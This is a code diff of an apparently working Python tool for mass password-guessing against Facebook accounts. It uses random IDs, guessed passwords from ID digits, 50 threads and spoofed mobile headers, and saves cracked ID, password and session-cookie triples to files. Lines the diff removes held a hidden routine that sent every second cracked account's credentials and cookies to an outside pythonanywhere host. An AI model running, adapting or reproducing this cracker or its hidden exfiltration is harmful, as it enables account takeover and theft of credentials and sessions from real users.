@@ -127,7 +127,7 @@ def crack(uid, password_list, total_count):
     # Thread-safe counter increment
     with counter_lock:
         global loop,bkas
-        
+        loop += 1
     
     colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
               "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
@@ -145,7 +145,7 @@ def crack(uid, password_list, total_count):
             sys.stdout.write(f"\r{color}CRACKING {progress} \033[1;92m{success_count}\033[1;97m:\033[1;91m{fail_count} \033[1;93m{percentage:.1f}%")
             sys.stdout.flush()
             
-            # Create session and generate device hash  "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),   re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
+            # Create session and generate device hash
             Session = requests.Session()
             facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
             bv = f"{random.randint(1111111,7777777)}"
@@ -155,7 +155,7 @@ def crack(uid, password_list, total_count):
             device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
             us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
             up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
-            url1 = "https://m.prod.facebook.com/"
+            url1 = "https://web.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
             head = {"authority": "m.prod.facebook.com",
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
@@ -171,45 +171,52 @@ def crack(uid, password_list, total_count):
             "viewport-width": "980"}
             requu1 = Session.get(url1,headers=head)
             log_data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
             'email': uid,
-            'login_source': 'comet_headerless_login',
-            'next': '',
-            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc3MTQ4ODI4MC42NTYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3NzE0ODgyODAuNjU3LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjV9XSwiMzAwMDIiOlt7InQiOjE3NzE0ODgyODAuNjU3LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NzE0ODgyODAuNjU3LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOlsiZW4tVVMiLCJlbiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzcxNDg4MjgwLjY1OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoxMDB9XSwiMzAwMDUiOlt7InQiOjE3NzE0ODgyODAuNjU4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOnsidyI6MTQ0MCwiaCI6ODI2fX1dLCIzMDAwNyI6W3sidCI6MTc3MTQ4ODI4MC42NTgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ImdyYW50ZWQifV0sIjMwMDA4IjpbeyJ0IjoxNzcxNDg4MjgwLjY4MywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiZ3JhbnRlZCJ9XSwiMzAwMTIiOlt7InQiOjE3NzE0ODgyODAuNjYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6Ikdvb2dsZSBJbmMuIn1dLCIzMDAxMyI6W3sidCI6MTc3MTQ4ODI4MC42NiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDUuMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGcvMTQ1LjAuMC4wIn1dLCIzMDAxNSI6W3sidCI6MTc3MTQ4ODI4MC42NiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiV2luMzIifV0sIjMwMDE4IjpbeyJ0IjoxNzcxNDg4MjgwLjY2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjJ9XSwiMzAwMjIiOlt7InQiOjE3NzE0ODgyODAuNjc0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOnRydWV9XSwiMzAwNDAiOlt7InQiOjE3NzE0ODgyODAuNjc0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOi0zMzB9XSwiMzAwOTMiOlt7InQiOjE3NzE0ODgyODAuNjc0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjB9XSwiMzAwOTQiOlt7InQiOjE3NzE0ODgyODAuNjc0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQ1LjAuMC4wIFNhZmFyaS81MzcuMzYgRWRnLzE0NS4wLjAuMCJ9XSwiMzAwOTUiOlt7InQiOjE3NzE0ODgyODAuNjc1LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjF9XSwiMzAxMDYiOlt7InQiOjE3NzE0ODgyODAuNjUzLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOmZhbHNlfSx7InQiOjE3NzE0ODgyODIuNDU2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOnRydWV9XSwiMzAxMDciOlt7InQiOjE3NzE0ODgyODAuNjU0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOmZhbHNlfV19',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            cookies = {
-            'datr': 'bfiWaQ-ztUMDinNiitDAT4Xz',
-            'fr': '0Aa5YrUSGNwX2vFe5..Bplvht..AAA.0.0.Bplvht.AWc6c0JZ3znzY7cWMVMewr_1vwM',
-            'sb': 'bfiWaSzLcrsML9YT6cT_wkuS',
-            'ps_l': '1',
-            'ps_n': '1',
-            'wd': '1034x796',}
-            headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://www.facebook.com',
-            'pragma': 'no-cache',
-            'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/?ref=homescreenpwa',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Microsoft Edge";v="145.0.3800.65", "Chromium";v="145.0.7632.76"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0',
-            'viewport-width': '1034',}
-            respon = Session.post('https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzcxNTAxNjc3LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',cookies=cookies,headers=headers,data=log_data)
+            'cuid': 'AYg-Zk3oBYS1IvkNsDBz-LJWCgiozUvirKReZ1dxv4ymdNH3-gkKiiEuQ3_Rpg2-uoR7dwTRnmUx9szEXe_sejzDUnWbSwZwAuHZk3vAOeLkUW_b-pZaVzxEfnOd8x6lbr-fj70m99RHpZ6fC6rmgYN1e_QBicJQHFf1syDbJj7I6fAxI9NAVX3N3s1Wl4txmUyFCGnqZ85kbHXGeJLvDbcbpXcjPc4TC4itvKF1DUZiMVg00N_n-VYTcff5UAZ9mCg',
+            'guid': 'ffcc6be62735888e9',
+            'lgnjs': '1765922875',
+            'lgnrnd': '140753__cXd',
+            'locale': 'en_GB',
+            'login_source': 'comet_login_header',
+            'next': 'https://www.facebook.com/logiy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzY1OTIyODUwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%253D%253D&next',
+            'skstamp': '',
+            'timezone': '-330',
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AZMZAAAAAFAA',
+            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc2NTkyMjg3Ni4xODcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjpmYWxzZX1dLCIzMDAwMSI6W3sidCI6MTc2NTkyMjg3Ni4xODcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijo1fV0sIjMwMDAyIjpbeyJ0IjoxNzY1OTIyODc2LjE4OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NjU5MjI4NzYuMTg4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6WyJlbi1JTiIsImVuLVVTIiwiZW4tR0IiLCJlbiIsImhpIiwiZ3UiLCJibiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzY1OTIyODc2LjE4OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjE1MH1dLCIzMDAwNSI6W3sidCI6MTc2NTkyMjg3Ni4xODgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijp7InciOjExMDUsImgiOjc3M319XSwiMzAwMDciOlt7InQiOjE3NjU5MjI4NzYuMTg4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzY1OTIyODc2LjIzOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJwcm9tcHQifV0sIjMwMDEyIjpbeyJ0IjoxNzY1OTIyODc2LjE5LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6Ikdvb2dsZSBJbmMuIn1dLCIzMDAxMyI6W3sidCI6MTc2NTkyMjg3Ni4xOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiI1LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0My4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDAxNSI6W3sidCI6MTc2NTkyMjg3Ni4xOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJXaW4zMiJ9XSwiMzAwMTgiOlt7InQiOjE3NjU5MjI4NzYuMTksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjoyfV0sIjMwMDIyIjpbeyJ0IjoxNzY1OTIyODc2LjIwNCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOnRydWV9XSwiMzAwNDAiOlt7InQiOjE3NjU5MjI4NzYuMjA0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6LTMzMH1dLCIzMDA5MyI6W3sidCI6MTc2NTkyMjg3Ni4yMDUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjowfV0sIjMwMDk0IjpbeyJ0IjoxNzY1OTIyODc2LjIwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQzLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDk1IjpbeyJ0IjoxNzY1OTIyODc2LjIwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjV9XSwiMzAxMDYiOlt7InQiOjE3NjU5MjI4NzYuMTg0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6ZmFsc2V9LHsidCI6MTc2NTkyMjg3Ni4yMjgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijp0cnVlfV0sIjMwMTA3IjpbeyJ0IjoxNzY1OTIyODc2LjE4NSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOmZhbHNlfV19',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(int(time.time()), pw),}
+            url = "https://web.facebook.com/login/device-based/regular/login/?login_attempt=1"
+            headers = {"authority": "web.facebook.com",
+            "method": "POST",
+            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
+            "scheme": "https",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+            "cache-control": "max-age=0",
+            "content-type": "application/x-www-form-urlencoded",
+            "dpr": "3",
+            "origin": "https://web.facebook.com",
+            "referer": "https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
+            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-model": "\"\"",
+            "sec-ch-ua-platform": "\"Linux\"",
+            "sec-ch-ua-platform-version": "\"\"",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+           "sec-fetch-site": "same-origin",
+           "sec-fetch-user": "?1",
+           "upgrade-insecure-requests": "1",
+           "user-agent": us,
+           "viewport-width": "980"}           
+            respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False)
             log_cookies = Session.cookies.get_dict().keys()
             # Check response
             if "c_user" in log_cookies:
@@ -219,16 +226,11 @@ def crack(uid, password_list, total_count):
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    bkas.append(uid)
-                    if len(bkas)% 2 == 0:
-                         statusok = (f"{user}|{pw}|{kuki}")
-                         requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:    
-                         print('\033[1;92m OK '+user+'|'+pw+'')
-                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                         open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
-                         oks.append(user)
-                         continue
+                    print('\033[1;92m OK '+user+'|'+pw+'')
+                    print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
+                    open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
+                    oks.append(user)
+                    continue
             elif 'checkpoint' in log_cookies:
                 print(f"\r\033[1;93m [⚠ SUMON_2f] {uid} | {pw}")
                 open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
@@ -237,7 +239,7 @@ def crack(uid, password_list, total_count):
             else:
                 #print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
                 continue
-        loop += 1
+                
     except requests.exceptions.Timeout:
         #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
         return False
@@ -248,7 +250,7 @@ def crack(uid, password_list, total_count):
         #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
         return False
     except KeyboardInterrupt:
-        #print(f"\r\033[1;93m [Interrupted] User stopped the process")
+        print(f"\r\033[1;93m [Interrupted] User stopped the process")
         raise
     except Exception as e:
         #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
@@ -268,10 +270,10 @@ def get_password_patterns(uid):
     """Generate password patterns based on UID"""
     return [
         uid[:6],     # First 6 digits
+        uid[:7],     # First 8 digits
         uid[:8],     # First 8 digits
         uid,         # Full number
         '57273200',  # Static common password
-        uid[:7],     # First 6 digits
     ]
 
 def random_number():
@@ -323,7 +325,7 @@ def random_number():
     # Start multi-threaded attack
     start_time = time.time()
     
-    with ThreadPoolExecutor(max_workers=60) as executor:
+    with ThreadPoolExecutor(max_workers=50) as executor:
         futures = []
         
         for random_id in idz:
